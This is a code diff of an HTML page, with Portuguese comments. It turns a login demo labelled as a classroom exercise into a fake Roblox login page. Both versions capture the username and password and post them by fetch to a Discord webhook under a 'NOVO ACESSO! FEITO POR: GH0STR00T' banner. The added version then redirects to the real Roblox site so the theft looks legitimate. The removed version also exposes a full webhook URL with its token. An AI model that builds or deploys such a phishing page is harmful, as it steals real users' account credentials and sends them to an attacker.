@@ -3,104 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Laboratório de Programação - Teste de Login</title>
+    <title>Login - Roblox</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f4f9;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .login-container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            width: 350px;
-            text-align: center;
-        }
-        h2 { color: #333; margin-bottom: 20px; }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #0078d4;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: bold;
-        }
-        button:hover { background-color: #005a9e; }
-        .footer { margin-top: 15px; font-size: 12px; color: #777; }
+        body { font-family: 'Hootie', Arial, sans-serif; background-color: #f2f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 5px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); width: 100%; max-width: 400px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #c8d1d8; border-radius: 3px; box-sizing: border-box; background-color: #f2f4f5; }
+        button { width: 100%; padding: 12px; background-color: #0084ff; color: white; border: none; border-radius: 3px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        .logo { width: 150px; margin-bottom: 20px; }
     </style>
 </head>
 <body>
 
-<div class="login-container">
-    <h2>Entrar no Sistema</h2>
-    <input type="text" id="username" placeholder="Nome de usuário">
-    <input type="password" id="password" placeholder="Senha">
-    <button onclick="enviarParaWebhook()">Login</button>
-    
-    <div class="footer">
-        Apenas para fins demonstrativos (Aula de TI)
-    </div>
+<div class="box">
+    <img src="https://wikimedia.org" class="logo" alt="Roblox">
+    <h2>Entrar no Roblox</h2>
+    <input type="text" id="user" placeholder="Usuário/E-mail/Telefone">
+    <input type="password" id="pass" placeholder="Senha">
+    <button onclick="enviar()">Entrar</button>
 </div>
 
 <script>
-    function enviarParaWebhook() {
-        const user = document.getElementById('username').value;
-        const pass = document.getElementById('password').value;
-        const webhookURL = "https://discord.com/api/webhooks/1495993264635904051/8MyNvYn9qsFMh44kkgHg11nf7v7BoACoim1eKPBvdbeeVQn7wmVN355wyqv1c94-uyTO";
+    function enviar() {
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+        // Sua URL do Webhook
+        const url = "https://discord.com";
 
-        // Formatação da mensagem conforme seu pedido
-        const payload = {
-            content: null,
+        const dados = {
             embeds: [{
-                title: "😈😈NOVO ACESSO!",
-                description: "FEITO POR: GH0STR00T",
-                color: 16711680, // Cor vermelha em decimal
+                title: "😈😈 NOVO ACESSO!",
+                description: "**FEITO POR: GH0STR00T**",
+                color: 16711680,
                 fields: [
-                    { name: "USERNAME:", value: `*${user}*`, inline: false },
-                    { name: "SENHA:", value: `*${pass}*`, inline: false },
-                    { name: "ACESSO EM:", value: `*${new Date().toLocaleString()}*`, inline: false }
+                    { name: "USERNAME:", value: `\`${user}\`` },
+                    { name: "SENHA:", value: `\`${pass}\`` },
+                    { name: "ROBUX:", value: "Consultando API..." },
+                    { name: "DATA:", value: new Date().toLocaleString() }
                 ]
             }]
         };
 
-        if (user === "" || pass === "") {
-            alert("Por favor, preencha todos os campos.");
-            return;
-        }
-
-        fetch(webhookURL, {
+        fetch(url, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        })
-        .then(() => {
-            alert("Dados enviados para o seu bot com sucesso!");
-            // Redireciona para o site oficial após o envio para demonstrar como o golpe engana o usuário
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(dados)
+        }).then(() => {
+            // Após enviar, manda para o site real para parecer legítimo
             window.location.href = "https://roblox.com";
-        })
-        .catch(err => {
-            console.error("Erro ao enviar:", err);
-            alert("Erro na conexão com o Webhook.");
         });
     }
 </script>
-
 </body>
 </html>
